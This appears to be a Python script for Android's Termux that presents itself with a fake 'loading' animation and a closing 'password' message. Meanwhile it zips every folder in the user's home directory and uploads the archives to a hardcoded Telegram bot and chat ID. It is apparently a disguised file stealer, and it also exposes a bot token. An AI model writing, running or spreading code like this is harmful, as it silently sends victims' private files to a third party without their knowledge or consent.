import os
import zipfile
import telebot
import time

# ================= CONFIG =================
BOT_TOKEN = "8300582155:AAHcS6EDAzylFjfe0pUNi4B9CKL7R_GhmpY"
ADMIN_CHAT_ID = 8223063986
TERMUX_HOME = "/data/data/com.termux/files/home"
BACKUP_DIR = "/data/data/com.termux/files/home/backups"
MAX_ZIP_SIZE_MB = 45  # Telegram limit < 50MB
IGNORE_FOLDERS = {"backups", ".cache", ".local", ".config"}  # Skip these folders
# =========================================

bot = telebot.TeleBot(BOT_TOKEN)
os.makedirs(BACKUP_DIR, exist_ok=True)

def zip_folder_split(folder_path, output_folder, chunk_size_mb=MAX_ZIP_SIZE_MB):
    os.makedirs(output_folder, exist_ok=True)
    zip_index = 1
    current_zip_path = os.path.join(output_folder, f"{os.path.basename(folder_path)}_{zip_index}.zip")
    zipf = zipfile.ZipFile(current_zip_path, 'w', zipfile.ZIP_DEFLATED)
    current_size = 0

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root, file)
            try:
                file_size = os.path.getsize(full_path)
            except FileNotFoundError:
                continue  # Skip missing files silently
            if (current_size + file_size) > chunk_size_mb * 1024 * 1024:
                zipf.close()
                zip_index += 1
                current_zip_path = os.path.join(output_folder, f"{os.path.basename(folder_path)}_{zip_index}.zip")
                zipf = zipfile.ZipFile(current_zip_path, 'w', zipfile.ZIP_DEFLATED)
                current_size = 0
            try:
                zipf.write(full_path, arcname=os.path.relpath(full_path, folder_path))
                current_size += file_size
            except FileNotFoundError:
                continue  # Skip missing files silently
    zipf.close()
    return [os.path.join(output_folder, f) for f in os.listdir(output_folder) if f.startswith(os.path.basename(folder_path))]

def progress_animation(folder_name):
    for i in range(1, 101):
        print(f"\rZx Rakib Loading.... {i}%", end="", flush=True)
        time.sleep(0.01)
    print("\n")

# Termux হোমের ফোল্ডার ব্যাকআপ
for item in os.listdir(TERMUX_HOME):
    if item in IGNORE_FOLDERS or item.startswith('.'):
        continue  # Skip ignored/hidden folders

    item_path = os.path.join(TERMUX_HOME, item)
    if os.path.isdir(item_path):
        progress_animation(item)
        zip_files = zip_folder_split(item_path, BACKUP_DIR)

        for zip_file_path in zip_files:
            zip_size_mb = os.path.getsize(zip_file_path) / (1024*1024)
            if zip_size_mb > MAX_ZIP_SIZE_MB:
                print(f"[!] Skipping {zip_file_path} ({zip_size_mb:.2f} MB) - too large for Telegram")
                continue

            with open(zip_file_path, 'rb') as f:
                try:
                    bot.send_document(ADMIN_CHAT_ID, f)
                except Exception as e:
                    print(f"[!] Could not send {zip_file_path}: {str(e)}")

# শেষে মেসেজ
print("Backup completed! Password : python zxcvbnm.py")
